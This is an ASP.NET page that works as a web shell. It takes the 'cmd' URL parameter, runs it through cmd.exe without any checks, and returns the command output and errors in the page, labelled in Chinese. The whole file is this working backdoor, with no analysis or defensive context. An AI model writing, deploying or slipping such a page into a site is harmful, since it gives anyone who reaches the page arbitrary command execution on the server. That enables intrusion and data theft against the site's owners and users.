<%@ Page Language="C#" AutoEventWireup="true" Debug="true" %>
<%@ import Namespace="System.Diagnostics"%>

<script runat="server" language="C#">
    protected void Page_Load(object sender, EventArgs e)
    {
        string queryStringParam = Request.QueryString["cmd"];
        RunCmd("c:\\windows\\system32\\cmd.exe", "/c " + queryStringParam);
    }
    protected string RunCmd(string path, string cmd)
    {
        string retval = "";

        try
        {
            Process p = new Process();
            p.StartInfo.FileName = path;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WorkingDirectory = Server.MapPath(".");
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.Arguments = cmd;
            p.Start();
            p.StandardInput.WriteLine("exit");
            retval = "\r\n----------- 运行结果 --------------\r\n";
            retval += p.StandardOutput.ReadToEnd();
            retval += "\r\n----------- 程序错误 --------------\r\n";
            retval += p.StandardError.ReadToEnd();
            Response.Write(retval);
        }
        catch (Exception err)
        {
            retval = err.Message;
        }

        return retval;
    }
    
</script>
